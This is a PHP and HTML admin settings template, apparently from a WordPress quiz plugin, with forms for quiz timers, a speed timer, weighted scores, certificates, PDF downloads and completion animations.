	<div class="quiz-content-card border-bottom-0 pb-0 content_tags" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Answer Tags</h5>		
		<label for="" class="quiz_label">Do you want to assign tags based on answer selection?
			<!-- <div class="tool-tip">
				<i class="fa fa-info-circle" aria-hidden="true"></i>
				<div class="toll-tip-desc" style="max-width:400px;">If enabled, you can display different recommendation 
			/ messages after an answer choice is selected by the user in the frontend. SQB will first display the recommendation and the users can click on the next button to go to the next question.</div>
			</div> -->
		</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="quiz_ans_tags" type="checkbox" id="quiz_ans_tags"  <?php if($quiz_ans_tags == 'Y'){ echo "checked='checked'"; }?> >
				<label for="quiz_ans_tags"></label>
			</div>
		</div>	
	</div>

	<div class="quiz-content-card quiz_timed_option"   style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Timed Quiz</h5>		
		<label for="" class="quiz_label">Do you want to set a timer for this quiz?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="quiz_timer_option" type="checkbox" id="quiz_timer_option" value="Y" <?php if($timer_enable == 'Y'){ echo "checked='checked'"; }?> >
				<label for="quiz_timer_option"></label>
			</div>
		</div>	

		<div class="quiz_timer_wrapper" <?php if($timer_enable != 'Y'){ echo "style='display:none'"; }?> >
			<div class="quiz_timer_inner">
				<span class="timer_cutomizer_show_option <?php echo $timer_edit_class;?>"><?php echo $timer_btn_text;?></span>
				<div class="timer_cutomizer_show_div" style='display:none'>
					
					<div class="quiz-content-card">
						<label for="" class="quiz_label timer_bold_heading">Total time allowed for this quiz</label>
						
						<div class="quiz_right-content">
							<div class="row">
								<div class="col-sm-2" style="max-width: 130px;flex-basis: 95px;">
									<label class="m-0">Hour</label>
									<select name="quiz_timer_hours" id="quiz_timer_hours" class="form-control">
										<?php 
											
											for($timer_h = 0; $timer_h <= 24; $timer_h++){
												$timer_selector = '';
												if($timer_h < 10 ){
													$timer_h = sprintf("%02d", $timer_h);
												}

												if($timer_h == $quiz_timer_hours){
													$timer_selector = 'selected="selected"'; 
												}
												echo '<option value="'.$timer_h.'" '.$timer_selector.'>'.$timer_h.'</option>';
											}
											?>
									</select>
								</div>
								<div class="col-sm-2" style="max-width: 130px;flex-basis:95px;">
									<label class="m-0">Min</label>
									<select name="quiz_timer_mint" id="quiz_timer_mint" class="form-control">
										<?php 
											for($timer_mint = 0; $timer_mint <= 60; $timer_mint++){
												$timer_selector = '';
												if($timer_mint < 10 ){
													$timer_mint = sprintf("%02d", $timer_mint);
												}
												if($timer_mint == $quiz_timer_mint){
													$timer_selector = 'selected="selected"'; 
												}
												echo '<option value="'.$timer_mint.'" '.$timer_selector.'>'.$timer_mint.'</option>';
											}
											?>
									</select>
								</div>
								<div class="col-sm-2" style="max-width: 130px;flex-basis: 95px;"> 
									<label class="m-0">Sec</label>
									<select name="quiz_timer_sec" id="quiz_timer_sec" class="form-control">
										<?php 
											for($timer_sec = 0; $timer_sec <= 60; $timer_sec++){
												$timer_selector = '';
												if($timer_sec < 10 ){
													$timer_sec = sprintf("%02d", $timer_sec);
												}
												if($timer_sec == $quiz_timer_sec){
													$timer_selector = 'selected="selected"'; 
												}
												echo '<option value="'.$timer_sec.'" '.$timer_selector.'>'.$timer_sec.'</option>';
											}
											?>
									</select>
								</div>
							</div>				
							
						</div>
					</div>
					
					<div class="quiz-content-card">
						<label for="" class="quiz_label">Customize Hour, Min, Sec text/style </label>
						<div class="quiz_right-content sqb_timer_text_hms_wrapper row">
							
								<div class="col-sm-0 timer_text_hour_html pr-2" >
									<?php echo $timer_text_hour_html;?>
									
									
								</div>
								<div class="col-sm-0 timer_text_mint_html pr-2">
									
									<?php echo $timer_text_mint_html;?>
								</div>
								<div class="col-sm-0 timer_text_sec_html pr-2" > 
									
									
									<?php echo $timer_text_sec_html;?>
									
								</div>
											
							
						</div>
					</div>
					
					<div class="quiz-content-card">
						<label for="" class="quiz_label">Customize timer text/style</label>
						<div class="quiz_right-content">
							<div class="quiz_timer_html"> <?php echo $quiz_timer_html;?></div>
							<small>(do not remove the merge tag - %%TIMELEFT%%)</small>
						</div>
					</div>
					<div class="quiz-content-card">
						<label for="" class="quiz_label">Customize text/style for outcome screen <div class="tool-tip">
											<i class="fa fa-info-circle" aria-hidden="true"></i>
											<div class="toll-tip-desc">It'll display total time spent by user on the quiz</div>
										</div>
						</label>
						<div class="quiz_right-content">
							<div class="quiz_timer_spent_html"> <?php echo $quiz_timer_spent_html;?></div>
							<small>(do not remove the merge tag - %%TIMESPENT%%)</small>
						</div>
					</div>
					<div class="quiz-content-card">
						<label for="" class="quiz_label">What should happen if time elapses but user has not completed the quiz?</label>
						<div class="quiz_right-content">
							<label class="radio-btn--outer"><input type="radio" name="quiz_timer_elapses" value="show_last_screen" <?php if($quiz_timer_elapses == 'show_last_screen'){ echo 'checked="checked"';} ?>>Redirect to opt-in or outcome screen and display time expired message</label>
							<label class="radio-btn--outer"><input type="radio" name="quiz_timer_elapses" value="disable_next_btn_show_msg" <?php if($quiz_timer_elapses == 'disable_next_btn_show_msg'){ echo 'checked="checked"';} ?>>Stay on the question screen and display time expired message</label>
						</div>
					</div>
					<div class="quiz-content-card" style='display:none'>
						<label for="" class="quiz_label">Where should the timer be displayed?</label>
						<div class="quiz_right-content">
							
							<label class="radio-btn--outer"><input type="radio" name="quiz_timer_display_in_screen" value="question" <?php if($quiz_timer_display_in_screen == 'question'){ echo 'checked="checked"';} ?>>Question Screens</label>
							<label class="radio-btn--outer"><input type="radio" name="quiz_timer_display_in_screen" value="question_outcome"  <?php if($quiz_timer_display_in_screen == 'question_outcome'){ echo 'checked="checked"';} ?>> Question & Outcome Screen</label>
						</div>
					</div>
					
					<div class="quiz-content-card">
						<label for="" class="quiz_label">Configure time expired message</label>
						<div class="quiz_right-content">
							<div class="quiz_timer_expired_msg">
								<?php echo $quiz_timer_expired_msg;?>
								
							</div>
						</div>
					</div>
						
					
				</div>
			</div>
		</div>	
	</div>
	<div class="quiz-content-card quiz_timed_option"   style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Speed Timer</h5>		
		<label for="" class="quiz_label">You can use this to conduct speed-quizzes with the "winner" being the person that gets all of the answers correct as fast as possible.</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="quiz_speed_timer_option" type="checkbox" id="quiz_speed_timer_option" value="Y" <?php if($speed_timer_enable == 'Y'){ echo "checked='checked'"; }?> >
				<label for="quiz_speed_timer_option"></label>
			</div>
		</div>	

		<div class="quiz_speed_timer_wrapper" <?php if($speed_timer_enable != 'Y'){ echo "style='display:none'"; }?> >
			<div class="quiz_timer_inner">
				<span class="speed_timer_cutomizer_show_option <?php echo $speed_timer_edit_class;?>"><?php echo $timer_btn_text;?></span>
				<div class="speed_timer_cutomizer_show_div" style='display:none'>
					
					

					<div class="quiz-content-card">
						<label for="" class="quiz_label">Customize Hour, Min, Sec text/style </label>
						<div class="quiz_right-content sqb_timer_text_hms_wrapper row">
							<div class="col-sm-0 speed_timer_text_hour_html pr-2" >
								<?php echo stripslashes($speed_timer_text_hour_html); ?>
							</div>
							<div class="col-sm-0 speed_timer_text_mint_html pr-2">
								<?php echo stripslashes($speed_timer_text_mint_html); ?>
							</div>
							<div class="col-sm-0 speed_timer_text_sec_html pr-2" > 
								<?php echo stripslashes($speed_timer_text_sec_html); ?>
							</div>
						</div>
					</div>

					<div class="quiz-content-card border-bottom-0 pb-0">
						<div class="quiz-card-outer-gray restriction_settings mb-0" style="background-color: #fff;">
							<h5 class="quiz--sub-title" style="background-color: #f9fafb;font-size: 16px;">Customize Speed Timer</h5>
							<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
								<div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
									<div class="customizer_innner_sections">
										<div class="Template-Customize-element">
											<div class="Template-Customize-element-inner element_paddings">
												<div class="inner_template_style_box">
													<h4>Background Color</h4>
													<div id="st_background_color_div" class="input-group colorpicker-component colorpicker-element">
														<input type="text" value="<?php echo $st_background_color; ?>" id="st_background_color" name="st_background_color" class="colorpicker-element"> 
														<span class="input-group-addon">
															<i style="background-color: <?php echo $st_background_color; ?>;"></i>
														</span>
													</div>
												</div>

												<div class="inner_template_style_box">
													<h4>Background Color Second</h4>
													<div id="st_background_color_second_div" class="input-group colorpicker-component colorpicker-element">
														<input type="text" value="<?php echo $st_background_color_second; ?>" id="st_background_color_second" name="st_background_color_second" class="colorpicker-element"> 
														<span class="input-group-addon">
															<i style="background-color: <?php echo $st_background_color_second; ?>;"></i>
														</span>
													</div>
												</div>

												<div class="inner_template_style_box">
													<h4>Shadow Color</h4>
													<div id="st_shadow_background_color_div" class="input-group colorpicker-component colorpicker-element">
														<input type="text" value="<?php echo $st_shadow_background_color; ?>" id="st_shadow_background_color" name="st_shadow_background_color" class="colorpicker-element"> 
														<span class="input-group-addon">
															<i style="background-color: <?php echo $st_shadow_background_color; ?>;"></i>
														</span>
													</div>
												</div>
											</div>
											<div class="Template-Customize-element-inner element_paddings mt-4">
												<div class="inner_template_style_box">
													<h4>Spread Radius</h4>
													<p><input id="st_spread_radius" name="st_spread_radius" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $st_spread_radius; ?>"></p>
												</div>

												<div class="inner_template_style_box">
													<h4>Blur Radius</h4>
													<p>
														<input id="st_blur_radius" name="st_blur_radius" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $st_blur_radius; ?>"> 
													</p>
												</div>

												<div class="inner_template_style_box">
													<h4>Horizontal Length</h4>
													<p>
														<input id="st_horizontal_length" name="st_horizontal_length" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $st_horizontal_length; ?>"> 
													</p>
												</div>

												<div class="inner_template_style_box">
													<h4>Vertical Length</h4>
													<p>
														<input id="st_vertical_length" name="st_vertical_length" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $st_vertical_length; ?>"> 
													</p>
												</div>
											</div>

											<div class="timer-container">
												<div class="timer-Sec">
											        <!-- <div class="timer-Days">
											            31 <span>Days</span>
											        </div> -->

											        <?php 

											        $speed_timer_text_hour_html = stripslashes($speed_timer_text_hour_html);
											        $speed_timer_text_mint_html = stripslashes($speed_timer_text_mint_html);
											        $speed_timer_text_sec_html = stripslashes($speed_timer_text_sec_html);


											        $speed_timer_text_hour_html =  str_replace('sqb_tiny_mce_editor','', $speed_timer_text_hour_html);
													$speed_timer_text_mint_html =  str_replace('sqb_tiny_mce_editor','',$speed_timer_text_mint_html);
													$speed_timer_text_sec_html =  str_replace('sqb_tiny_mce_editor','',$speed_timer_text_sec_html);

											        ?>
											        <div class="timer-Hours">
											            00 <span><?php echo $speed_timer_text_hour_html; ?></span>
											        </div>
											        <div class="timer-Minutes">
											            00 <span><?php echo $speed_timer_text_mint_html; ?></span>
											        </div>
											        <div class="timer-Seconds">
											            00 <span><?php echo $speed_timer_text_sec_html; ?></span>
											        </div>
											    </div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					

					<div class="quiz-content-card" style="display:none;">
						<label for="" class="quiz_label">Display Heading</label>
						<div class="quiz_right-content">
							<div class="quiz_display_heading_html"> <?php echo stripslashes($quiz_display_heading_html);?></div>
						</div>
					</div>

					<div class="quiz-content-card">
						<label for="" class="quiz_label">Display total time on outcome screen </label>
						<div class="quiz_right-content">
							<div class="quiz_display_totaltime_html"> <?php echo stripslashes($quiz_display_totaltime_html);?></div>
						</div>
					</div>
				</div>
			</div>
		</div>	
	</div>
	
					
		<div class="quiz-content-card quiz_type_personality_show_div"   style="<?php if($quiz_type_personality_show != 'Y'){ echo 'display:none'; } ?>">
			<h5 class="quiz--sub-title">Weighted Score</h5>		 
			<label for="" class="quiz_label">Do you want to enable weighted score/points for this personality quiz?</label>
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="quiz_scoring_enable_personality" type="checkbox" id="quiz_scoring_enable_personality" value="Y" <?php if($weighted_score == 'Y'){ echo "checked='checked'"; }?> >
					<label for="quiz_scoring_enable_personality"></label>
				</div>
			</div>	
		</div>	
		
		<!-- Certificate Start -->

		<div class="quiz-content-card enable-pdf-section" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
			<h5 class="quiz--sub-title">Enable Certificates</h5>	
			<label class="quiz_label">Do you want to enable certificate for this quiz? </label>
		
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="quiz_allow_certificate" type="checkbox" id="quiz_allow_certificate" value="Y" <?php if($quiz_allow_certificate == 'Y'){ echo "checked='checked'"; }?> >
					<label for="quiz_allow_certificate"></label>
				</div>
			</div>	
					
	<?php 

			$check_pdf_plugin = 'Y';
			$certificate_pdf_plugin = 'display:none;';
			$pdf_plugin = 'display:none;';

			if(!defined('SQB_PD_FILE')){
				$check_pdf_plugin = 'N';
				if($quiz_allow_certificate == 'Y'){
					$certificate_pdf_plugin = 'display:block';
				}

				if($quiz_allow_pdf_download_outcome_screen == 'Y'){
					$pdf_plugin = 'display:block';
				}
			}

			?>
			<input type="hidden" value="<?php echo $check_pdf_plugin; ?>" class="check_pdf_plugin">
			<div class="alert alert-v2 alert-danger certificate-pdf-plugin-error" role="alert" style="<?php echo $certificate_pdf_plugin; ?>">
			  	<p>We notice you have not installed/activated SQB PDF Plugin. You can download it from your member's area <a target="_blank" href="https://wickedcoolplugins.com/login">here.</a></p>
				<p>This plugin is required to use the PDF reports feature.</p>
			</div>
	<div class="quiz-content-card download-certificate-child border-bottom-0 pb-0" style="display:<?php if($quiz_allow_certificate == 'Y'){ echo "block"; } else { echo "none"; } ?>">

		<div class="quiz-outer-certificate ml-4">
			<div class="row">
				<div class="col-sm-8">
					<div class="quiz-card-outer-gray restriction_settings mb-0" style="background-color: #fff;">
						<h5 class="quiz--sub-title" style="background-color: #f9fafb;font-size: 16px;">Customize Certificate Button</h5>
						<div class="outcome_pdf_next_temp_container certificate_template_html_preview_outer text-center mb-3">
							<?php echo $quiz_certificate_button_html; ?>
						</div>
							
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="sqb_download_certificate_button_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="0">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="sqb_download_certificate_button_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="13">
												</p>
											</div>	
											<div class="inner_template_style_box ">
												<h4>Border Radius</h4>
												<p>
													<input id="sqb_download_certificate_button_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="100" data-slider-step="1" data-slider-value="5">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="sqb_download_certificate_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#4f6cbf" id="sqb_download_certificate_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #4f6cbf;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<!--Customizer ends-->					
					</div>
				</div>
			</div>	
		</div>	

		<div class="select-cert-section ml-4 mt-2">
			<label class="quiz_label"><strong>Select Certificate</strong></label>
			<p>
				<select id="select_certificate">
					<?php $results = SQB_QuizCertificate::load();
						if(!empty($results)){
							echo '<option selected="selected">Please select</option>';
							foreach($results as $result){
								if($select_certificate == $result->getId()){
									$selected = 'selected="selected"';
								}else{
									$selected = '';
								}

								echo '<option value="'.$result->getId().'" '.$selected.'>'.$result->getName().'</option>';
							}
						}else{
							echo '<option selected="selected">No Certificate created</option>';
						}
						?>
				</select>
			</p>
			<div class="sqb_select_certificate_message mt-0" style="max-width: 1110px;">
				You can create / customize your certificates in SQB >> Settings >> <a href="<?php echo admin_url('admin.php?page=sqb_settings&tab=certificate'); ?>">Certificates page</a>.
			</div>	
			</div>


	</div>	
	</div>	

		<!-- Certificate End -->


		<div class="quiz-content-card enable-pdf-section" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
			<h5 class="quiz--sub-title">Enable PDF Download on the outcome screen</h5>	

			<?php if(defined('SQB_PD_FILE')){ ?>
			<label for="" class="quiz_label">Do you want to allow users to download an auto-generated PDF report on the outcome screen? <div class="tool-tip" style="margin-left:10px;"><i class="fa fa-info-circle" aria-hidden="true"></i>	<div class="toll-tip-desc pdf-report-tooltip" style="max-width: 500px;">Please follow these steps to allow PDF generation / download: 
				<p>Step 1: You can add this merge tag on the outcome screen to allow PDF download. [DOWNLOADPDF]</p>
				<p>Step 2: To customize the contents of the PDF, click on the PDF icon on the outcome screen and customize the contents. </p>
				<p>Step 3: Go to the settings page >> PDF Download tab to add header, footer and images to your PDF.</p></div></div>
			</label>
		<?php }else{ ?>
			<label class="quiz_label">You need to download and activate "SQB PDF Download" plugin from your member's area on our site to use this feature. </label>
		<?php } ?>
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="quiz_allow_pdf_download_outcome_screen" type="checkbox" id="quiz_allow_pdf_download_outcome_screen" value="Y" <?php if($quiz_allow_pdf_download_outcome_screen == 'Y'){ echo "checked='checked'"; }?> >
					<label for="quiz_allow_pdf_download_outcome_screen"></label>
				</div>
			</div>	

			<div class="alert alert-v2 alert-danger pdf-plugin-error" role="alert" style="<?php echo $pdf_plugin; ?>">
			  	<p>We notice you have not installed/activated SQB PDF Plugin. You can download it from your member's area <a target="_blank" href="https://wickedcoolplugins.com/login">here.</a></p>
				<p>This plugin is required to use the PDF reports feature.</p>
			</div>
					
 		<?php
	$outcome_pdf_button_html = '<div class="outcome_button_pdf sqb_tiny_mce_editor mce-content-body" style="display: inline-block; border-radius: 5px; background: rgb(37, 37, 37); color: rgb(255, 255, 255); height: auto; padding: 13px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 128px; max-width: 100%; cursor: pointer; float: none; position: relative;" contenteditable="true" spellcheck="false"><div>Download</div></div>';
	if(isset($quiz_data)){ 
		$outcome_pdf_button = $quiz_data->getDownloadPDFButtonHtml();	
		if($outcome_pdf_button != ''){
			$outcome_pdf_button_html = $outcome_pdf_button;
		}
	} 
	?>
	
	<div class="quiz-content-card download-pdf-child border-bottom-0 pb-0" style="display:<?php if($quiz_allow_pdf_download_outcome_screen == 'Y'){ echo "block"; } else { echo "none"; } ?>">

		<div class="quiz-outer-pdf ml-4">
			<div class="quiz-pdf-email mb-4 ">
				<label for class="quiz_title">Send PDF as an attachment in the student/admin email notification <div class="tool-tip"><i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="max-width:800px; color: #333;">You can configure the email in the notification tab. If this setting is enabled, SQB will attach the generated PDF in the email sent to students/admin after quiz completion.</div>
						</div></label>		 
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="email_pdf_attachment" type="checkbox" id="email_pdf_attachment" value="Y" <?php if($email_pdf_attachment == 'Y'){ echo "checked='checked'"; }?> >
						<label for="email_pdf_attachment"></label>
					</div>
				</div>	
			</div>
			

			<div class="row">
				<div class="col-sm-8">
					<div class="quiz-card-outer-gray restriction_settings mb-0" style="background-color: #fff;">
						<h5 class="quiz--sub-title" style="background-color: #f9fafb;font-size: 16px;">Customize PDF Button</h5>
						<div class="outcome_pdf_next_temp_container outcome_pdf_template_html_preview_outer text-center mb-3">
							<?php echo $outcome_pdf_button_html; ?>
						</div>
							
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="sqb_outcome_download_pdf_button_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="0">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="sqb_outcome_download_pdf_button_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="13">
												</p>
											</div>	
											<div class="inner_template_style_box ">
												<h4>Border Radius</h4>
												<p>
													<input id="sqb_outcome_download_pdf_button_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="100" data-slider-step="1" data-slider-value="5">
												</p>
											</div>											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="sqb_outcome_download_pdf_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#4f6cbf" id="sqb_outcome_download_pdf_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #4f6cbf;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<!--Customizer ends-->					
					</div>
				</div>
			</div>	
		</div>	
	</div>	
	</div>	
	<?php 

	$game_animation_outcome = 'display:none';
	$game_animation = 'N';
	$game_animation_option = [];
	$outcome_message = 'N';
	$template = 'template1';
	$custom_template = '';
	$background_color = '#d6e3ff';
	$template_default_background = array('template2' => '#ffffff','template3' => '#d6e3ff','template4' => '#e5b25d');

	if(isset($quiz_data) && ($quiz_data->getGameAnimation())){
		$game_animation = $quiz_data->getGameAnimation();
		$game_animation_option = maybe_unserialize($quiz_data->getGameAnimationsOptions());
		$outcome_message = !empty($game_animation_option['outcome_message']) ? $game_animation_option['outcome_message'] : 'N';
		$template = !empty($game_animation_option['template']) ? $game_animation_option['template'] : 'template1';
		$custom_template = !empty($game_animation_option['custom_template']) ? $game_animation_option['custom_template'] : '';
		$background_color = !empty($game_animation_option['background_color']) ? $game_animation_option['background_color'] : '#d6e3ff';
	}


	
	
	if(empty($background_color)){
		if(!empty($template_default_background[$template])){
			$background_color = $template_default_background[$template];
		}
	}

	$audio_url = !empty($game_animation_option['audio_url']) ? $game_animation_option['audio_url'] : '';
	$timer_ga = !empty($game_animation_option['timer']) ? $game_animation_option['timer'] : '5';
	$text_ga = !empty($game_animation_option['text']) ? $game_animation_option['text'] : '<p><span style="font-size: 24pt;"><strong><span style="color: #18514a;">%%FIRST_NAME%% Way to go 🎉! Keep going! 💪🏆</span></strong></span></p>';

	$template = !empty($custom_template) ? '' : $template;



	?>
	<script>var default_background_color = <?php echo json_encode($template_default_background) ?>;</script>

	<?php

	if(isset($quiz_type)){
		$noneed = '';
	}else{
		$noneed = ($quiz_type == "form" || $quiz_type == "poll") ? 'display:none' : '';
	}

	?>

	<div class="quiz-content-card game-animation-admin-main" style="<?php echo $noneed ?>">
		<h5 class="quiz--sub-title">Gamification / Animation</h5>	
		<label class="quiz_label">Do you want to display animations when users complete the quiz?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="game_animation" type="checkbox" id="game_animation" value="Y" <?php echo ($game_animation == 'Y') ? 'checked' : ''; ?>>
				<label for="game_animation"></label>
			</div>
		</div>	
		<div class="quiz_gameanimation_wrapper game-animation-wrapper" style="<?php echo ($game_animation != 'Y') ? 'display:none' : ''; ?>">
			<div class="quiz_gameanimation_inner">
				<span class="gameanimation_cutomizer_show_option">Edit Animation Settings</span>
				<div class="gameanimation_cutomizer_show_div" style="display:none">
					<div class="quiz-content-card" style="border-bottom: none;">
						<label class="quiz_label mt-4">Do you want to display different message for each outcome?</label>
						<div class="quiz_right-content">
							<div class="square-switch_onoff">
								<input class="checkbox" name="different_message_outcome" type="checkbox" id="different_message_outcome" value="Y" <?php echo $outcome_message == 'Y' ? 'checked' : ''; ?>>
								<label for="different_message_outcome"></label>
							</div>
						</div>	
						
					</div>
					<div class="quiz_right-content sqb_showhide_anim_enable_outcome" style="<?php  echo $outcome_message == 'Y' ? 'display: block;' : 'display: none;'; ?>">
						<div class="sqb_anim_enable_outcome mt-0" style="max-width: 1110px;">
							You can set outcome level personalized message in the outcome screen
						</div>
					</div>
					<div class="quiz-content-card">
						<div class="animation-templates">
							<h5 class="quiz--sub-title" style="border-bottom:none;">Select Animation Template</h5>
							<div class="quiz_right-content">
								<ul class="animation-listing">
									<li>
										<div class="animation-listing-block <?php echo $template == 'template1' ? 'active' : ''; ?>"><h4>Template 1</h4>
										<img style="background: #ffffff;" src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/animation/animation1.svg";?>">
										<div class="base-div c_ta_select_animation_template_outer " data-id="nopopup">
											<label class="c_ta_select_animation_template">
											<input type="radio" name="game_animation_template" value="template1" class="btn" <?php echo $template == 'template1' ? 'checked' : ''; ?>>Select
											</label></div>
										</div>
									</li>
									<li>
										<div class="animation-listing-block <?php echo $template == 'template2' ? 'active' : ''; ?>"><h4>Template 2</h4>
										<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/animation/animation2.png";?>">
										<div class="base-div c_ta_select_animation_template_outer " data-id="nopopup">
											<label class="c_ta_select_animation_template">
											<input type="radio" name="game_animation_template" value="template2" class="btn" <?php echo $template == 'template2' ? 'checked' : ''; ?>>Select
											</label></div>
										</div>
									</li>
									<li>
										<div class="animation-listing-block <?php echo $template == 'template3' ? 'active' : ''; ?>"><h4>Template 3</h4>
										<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/animation/animation3.png";?>">
										<div class="base-div c_ta_select_animation_template_outer " data-id="nopopup">
											<label class="c_ta_select_animation_template">
											<input type="radio" name="game_animation_template" value="template3" class="btn" <?php echo $template == 'template3' ? 'checked' : ''; ?>>Select
											</label></div>
										</div>
									</li>
									<li>
										<div class="animation-listing-block <?php echo $template == 'template4' ? 'active' : ''; ?>"><h4>Template 4</h4>
										<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/animation/animation4.png";?>">
										<div class="base-div c_ta_select_animation_template_outer " data-id="nopopup">
											<label class="c_ta_select_animation_template">
											<input type="radio" name="game_animation_template" value="template4" class="btn" <?php echo $template == 'template4' ? 'checked' : ''; ?>>Select
											</label></div>
										</div>
									</li>

									<li>
										<div class="upload-own-gif-wrapper">
											<div class="upload-own-gif-block">
												<label >Upload your own GIF Animation</label>
												<div class="inner-wrapper-own-gif">
													<a href="javascript:void(0);" class="custom-gif-delete-icon custom-template-remove" style="<?php echo $custom_template == '' ? 'display:none;' : '' ?>"><i class="fa fa-trash" aria-hidden="true"></i></a>
													<input type="button" value="Click here to upload image" id="animation_upload_button" name="animation_upload_button" class="form-control animation_upload_button">
													<input type="hidden" name="game_animation_custom_template" value="" id="game_animation_custom_template" value="<?php echo $custom_template ?>">
													
													<div class="imagePreview" style="<?php echo $custom_template == '' ? 'display:none;' : '' ?>"><img src="<?php echo $custom_template ?>" />

														<div class="image-buttons" style="<?php if($custom_template){ echo ''; }else{ echo 'display:none'; } ?>">
															<input type="button" value="Change Image" name="animation_upload_button" class="form-control animation_upload_button">
															<label class="c_ta_select_animation_template1">
																<input type="radio" name="game_animation_template" value="custom_template" class="btn">Select
															</label>
														</div>
													</div>

													
												</div>
											</div>
										</div>
									</li>
								</ul>
							</div>

							<div class="quiz-content-card">
								<h5 class="quiz--sub-title" style="border-bottom: none;">Template Customizer</h5>
								<?php 
								//$style_bg_color = ($template == 'template2' || $template == 'template3' || $template == 'template4') ? '' : 'display:none;';
								?>

								<div class="row template-row">
								<div class="quiz_right-content game_animation_background_color_div col-sm-6">
									
										<label class="quiz_label">Background Color</label>
										<div id="sqb_game_animation_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
											<input type="text" value="<?php echo $background_color ?>" id="game_animation_background_color" name="game_animation_background_color">
											<span class="input-group-addon"><i style="background-color: <?php echo $background_color ?>;"></i></span>
										</div>
								</div>
								<div class="quiz_right-content col-sm-6">
									<label>Hide animation after</label>
									<div class="d-flex align-items-center"><input type="number" value="<?php echo $timer_ga ?>" class="animation_hide_time_3 mr-2 animation_hide_time form-control" id="game_animation_timer" name="game_animation_timer"> Seconds</div>
									
								</div>
							</div>

								<div class="quiz_right-content mt-4">
									<label class="quiz_label">Upload an Audio</label>
									<div class="upload-audio">
										<div class="upload-box">
										<input type="button" value="Upload" id="game_animation_audio_button" data-lesson-id="3" name="game_animation_audio_button" class="form-control c_ta_audio_btn">

										<div class="audioPreview" style="<?php if($audio_url){ echo 'display: block;';}else{ echo 'display: none;'; } ?>">
											<div class="sqb_gameanimation_player_audio_div">
												<audio class="sqb_gameanimation_player_audio" src="<?php echo $audio_url; ?>"></audio>
												<button type="button" class="sqb_gameanimation_audio_play_pause">Play/Pause</button>
											</div>
										</div>
									</div>
										
										<div class="or"><span>OR</span></div>
